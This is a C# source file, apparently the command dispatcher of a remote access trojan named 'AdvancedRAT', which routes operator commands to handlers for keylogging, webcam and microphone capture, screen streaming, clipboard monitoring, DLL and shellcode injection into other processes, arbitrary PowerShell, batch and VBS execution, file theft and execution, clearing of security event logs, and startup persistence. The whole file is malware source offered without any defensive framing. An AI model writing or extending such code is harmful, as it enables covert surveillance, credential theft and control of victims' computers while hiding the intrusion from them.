using System;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace AdvancedRAT.Client.Handlers
{
    public class CommandHandler
    {
        private FileHandler fileHandler;
        private ProcessHandler processHandler;
        private RegistryHandler registryHandler;
        private ServiceHandler serviceHandler;
        private ScreenHandler screenHandler;
        private WebcamHandler webcamHandler;
        private AudioHandler audioHandler;
        private AdvancedKeyloggerHandler keyloggerHandler;
        private MouseHandler mouseHandler;
        private UIHandler uiHandler;
        private InjectionHandler injectionHandler;
        private ScriptHandler scriptHandler;
        private ChatHandler chatHandler;
        private FunHandler funHandler;
        private SystemInfoHandler systemInfoHandler;
        private PowerHandler powerHandler;
        private FileSearchHandler fileSearchHandler;
        private WMIHandler wmiHandler;
        private EventLogHandler eventLogHandler;
        private RemoteTextEditorHandler editorHandler;
        private WindowCaptureHandler windowHandler;
        private ClipboardHandler clipboardHandler;
        private StartupHandler startupHandler;
        
        public CommandHandler()
        {
            fileHandler = new FileHandler();
            processHandler = new ProcessHandler();
            registryHandler = new RegistryHandler();
            serviceHandler = new ServiceHandler();
            screenHandler = new ScreenHandler();
            webcamHandler = new WebcamHandler();
            audioHandler = new AudioHandler();
            keyloggerHandler = new AdvancedKeyloggerHandler();
            mouseHandler = new MouseHandler();
            uiHandler = new UIHandler();
            injectionHandler = new InjectionHandler();
            scriptHandler = new ScriptHandler();
            chatHandler = new ChatHandler();
            funHandler = new FunHandler();
            systemInfoHandler = new SystemInfoHandler();
            powerHandler = new PowerHandler();
            fileSearchHandler = new FileSearchHandler();
            wmiHandler = new WMIHandler();
            eventLogHandler = new EventLogHandler();
            editorHandler = new RemoteTextEditorHandler();
            windowHandler = new WindowCaptureHandler();
            clipboardHandler = new ClipboardHandler();
            startupHandler = new StartupHandler();
        }
        
        public async Task<object> Execute(dynamic command)
        {
            string type = command.type.ToString();
            
            return type switch
            {
                "file_list" => await fileHandler.ListFiles(command.path.ToString()),
                "file_download" => await fileHandler.DownloadFile(command.path.ToString()),
                "file_upload" => await fileHandler.UploadFile(command.path.ToString(), command.data),
                "file_delete" => await fileHandler.DeleteFile(command.path.ToString()),
                "file_execute" => await fileHandler.ExecuteFile(command.path.ToString()),
                
                "process_list" => await processHandler.GetProcessList(),
                "process_kill" => await processHandler.KillProcess((int)command.pid),
                "process_info" => await processHandler.GetProcessInfo((int)command.pid),
                
                "registry_read" => await registryHandler.ReadKey(command.path.ToString()),
                "registry_write" => await registryHandler.WriteKey(command.path.ToString(), command.name.ToString(), command.value),
                "registry_delete" => await registryHandler.DeleteKey(command.path.ToString()),
                
                "service_list" => await serviceHandler.GetServiceList(),
                "service_start" => await serviceHandler.StartService(command.name.ToString()),
                "service_stop" => await serviceHandler.StopService(command.name.ToString()),
                
                "screenshot" => await screenHandler.CaptureScreen(),
                "screen_stream" => await screenHandler.StartStreaming(),
                
                "webcam_list" => await webcamHandler.GetWebcamList(),
                "webcam_capture" => await webcamHandler.CaptureImage((int)command.device),
                "webcam_stream" => await webcamHandler.StartStreaming((int)command.device),
                
                "audio_record_start" => await audioHandler.StartRecording(),
                "audio_record_stop" => await audioHandler.StopRecording(),
                "audio_play" => await audioHandler.PlaySound(command.data),
                
                // Keylogger commands (Advanced)
                "keylogger_start" => await keyloggerHandler.Start(),
                "keylogger_stop" => await keyloggerHandler.Stop(),
                "keylogger_get" => await keyloggerHandler.GetLogs(),
                "keylogger_new" => await keyloggerHandler.NewLog(),
                "keylogger_delete" => await keyloggerHandler.DeleteLog(),
                
                "mouse_move" => await mouseHandler.MoveMouse((int)command.x, (int)command.y),
                "mouse_click" => await mouseHandler.Click(),
                "mouse_hide" => await mouseHandler.Hide(),
                "mouse_show" => await mouseHandler.Show(),
                "mouse_lock" => await mouseHandler.Lock(),
                "mouse_unlock" => await mouseHandler.Unlock(),
                
                // UI commands (고유 기능만)
                "ui_wallpaper" => await uiHandler.ChangeWallpaper(command.path.ToString()),
                "ui_wallpaper_base64" => await uiHandler.ChangeWallpaperFromBase64(command.image.ToString()),
                "ui_message" => await uiHandler.ShowMessage(command.title.ToString(), command.text.ToString(), command.icon?.ToString() ?? "Information"),
                "ui_hide_desktop" => await uiHandler.HideDesktopIcons(),
                "ui_show_desktop" => await uiHandler.ShowDesktopIcons(),
                
                "inject_dll" => await injectionHandler.InjectDLL((int)command.pid, command.path.ToString()),
                "inject_shellcode" => await injectionHandler.InjectShellcode((int)command.pid, command.shellcode.ToString()),
                "inject_pe" => await injectionHandler.InjectPE((int)command.pid, command.data),
                
                "script_powershell" => await scriptHandler.ExecutePowerShell(command.script.ToString()),
                "script_batch" => await scriptHandler.ExecuteBatch(command.script.ToString()),
                "script_vbs" => await scriptHandler.ExecuteVBS(command.script.ToString()),
                
                // Chat commands
                "chat_init" => await chatHandler.Initialize(),
                "chat_message" => await chatHandler.ShowMessage(command.user.ToString(), command.message.ToString()),
                "chat_maximize" => await chatHandler.Maximize(),
                "chat_minimize" => await chatHandler.Minimize(),
                "chat_normal" => await chatHandler.Normal(),
                "chat_close" => await chatHandler.Close(),
                
                // Fun/Prank commands
                "fun_crazy_mouse" => await funHandler.CrazyMouse(),
                "fun_lock_mouse" => await funHandler.LockMouse(),
                "fun_unlock_mouse" => await funHandler.UnlockMouse(),
                "fun_mouse_trails" => await funHandler.MouseTrails(),
                "fun_keyboard_smile" => await funHandler.KeyboardSmile(),
                "fun_balloon_tip" => await funHandler.ShowBalloonTip((int)command.duration, command.title.ToString(), command.text.ToString(), command.icon.ToString()),
                "fun_messagebox_spam" => await funHandler.MessageBoxSpam(command.title.ToString(), command.text.ToString(), (int)command.count),
                "fun_toggle_desktop" => await funHandler.ToggleDesktopIcons(),
                "fun_toggle_taskbar" => await funHandler.ToggleTaskbar(),
                "fun_toggle_start" => await funHandler.ToggleStartButton(),
                "fun_toggle_tray" => await funHandler.ToggleTray(),
                "fun_toggle_clock" => await funHandler.ToggleClock(),
                
                // System Info commands
                "system_info_full" => await systemInfoHandler.GetFullSystemInfo(),
                
                // Power commands
                "power_shutdown" => await powerHandler.Shutdown((bool)(command.force ?? false)),
                "power_reboot" => await powerHandler.Reboot((bool)(command.force ?? false)),
                "power_logoff" => await powerHandler.Logoff((bool)(command.force ?? false)),
                "power_hibernate" => await powerHandler.Hibernate(),
                "power_sleep" => await powerHandler.Sleep(),
                "power_lock" => await powerHandler.Lock(),
                
                // File Search commands
                "file_search" => await fileSearchHandler.SearchFiles(command.path.ToString(), command.pattern.ToString(), (bool)(command.includeSubdirs ?? true)),
                "file_search_extension" => await fileSearchHandler.SearchByExtension(command.path.ToString(), command.extension.ToString(), (bool)(command.includeSubdirs ?? true)),
                "file_search_size" => await fileSearchHandler.SearchBySize(command.path.ToString(), (long)command.minSize, (long)command.maxSize, (bool)(command.includeSubdirs ?? true)),
                "file_search_date" => await fileSearchHandler.SearchByDate(command.path.ToString(), DateTime.Parse(command.fromDate.ToString()), DateTime.Parse(command.toDate.ToString()), (bool)(command.includeSubdirs ?? true)),
                "file_search_stop" => await fileSearchHandler.StopSearch(),
                
                // WMI commands
                "wmi_query" => await wmiHandler.ExecuteQuery(command.query.ToString()),
                "wmi_hardware" => await wmiHandler.GetHardwareInfo(),
                "wmi_software" => await wmiHandler.GetSoftwareInfo(),
                "wmi_network" => await wmiHandler.GetNetworkInfo(),
                "wmi_processes" => await wmiHandler.GetProcessInfo(),
                
                // EventLog commands
                "eventlog_system" => await eventLogHandler.GetSystemLogs((int)(command.maxEntries ?? 100)),
                "eventlog_application" => await eventLogHandler.GetApplicationLogs((int)(command.maxEntries ?? 100)),
                "eventlog_security" => await eventLogHandler.GetSecurityLogs((int)(command.maxEntries ?? 100)),
                "eventlog_filter" => await eventLogHandler.GetFilteredLogs(
                    command.logName.ToString(), 
                    command.level?.ToString(), 
                    command.source?.ToString(), 
                    command.fromDate != null ? DateTime.Parse(command.fromDate.ToString()) : (DateTime?)null,
                    command.toDate != null ? DateTime.Parse(command.toDate.ToString()) : (DateTime?)null,
                    (int)(command.maxEntries ?? 100)
                ),
                "eventlog_search" => await eventLogHandler.SearchLogs(command.logName.ToString(), command.searchText.ToString(), (int)(command.maxEntries ?? 100)),
                "eventlog_list" => await eventLogHandler.GetLogList(),
                "eventlog_clear" => await eventLogHandler.ClearLog(command.logName.ToString()),
                
                // Remote Text Editor commands
                "editor_open" => await editorHandler.OpenFile(command.path.ToString()),
                "editor_save" => await editorHandler.SaveFile(command.path.ToString(), command.content.ToString()),
                "editor_read" => await editorHandler.ReadFile(command.path.ToString(), (int)(command.startLine ?? 0), (int)(command.lineCount ?? -1)),
                "editor_create" => await editorHandler.CreateFile(command.path.ToString(), command.content?.ToString() ?? ""),
                "editor_append" => await editorHandler.AppendFile(command.path.ToString(), command.content.ToString()),
                "editor_info" => await editorHandler.GetFileInfo(command.path.ToString()),
                
                // Window Capture commands
                "window_list" => await windowHandler.GetWindowList(),
                "window_capture" => await windowHandler.CaptureWindow(command.handle.ToString()),
                "window_activate" => await windowHandler.ActivateWindow(command.handle.ToString()),
                "window_active" => await windowHandler.GetActiveWindow(),
                "window_find" => await windowHandler.FindWindow(command.pattern.ToString()),
                
                // Clipboard commands
                "clipboard_get" => await clipboardHandler.GetClipboard(),
                "clipboard_set" => await clipboardHandler.SetClipboard(command.content.ToString(), command.type?.ToString() ?? "text"),
                "clipboard_monitor_start" => await clipboardHandler.StartMonitoring(),
                "clipboard_monitor_stop" => await clipboardHandler.StopMonitoring(),
                "clipboard_history" => await clipboardHandler.GetHistory(),
                "clipboard_clear_history" => await clipboardHandler.ClearHistory(),
                "clipboard_clear" => await clipboardHandler.ClearClipboard(),
                
                // Startup commands
                "startup_list" => await startupHandler.GetStartupList(),
                "startup_add" => await startupHandler.AddStartup(command.name.ToString(), command.path.ToString(), command.location?.ToString() ?? "HKCU"),
                "startup_remove" => await startupHandler.RemoveStartup(command.name.ToString(), command.location?.ToString() ?? "HKCU"),
                "startup_check" => await startupHandler.CheckStartupExists(command.name.ToString()),
                "startup_folder" => await startupHandler.GetStartupFolderPath(),
                
                _ => new { success = false, message = "Unknown command" }
            };
        }
    }
}
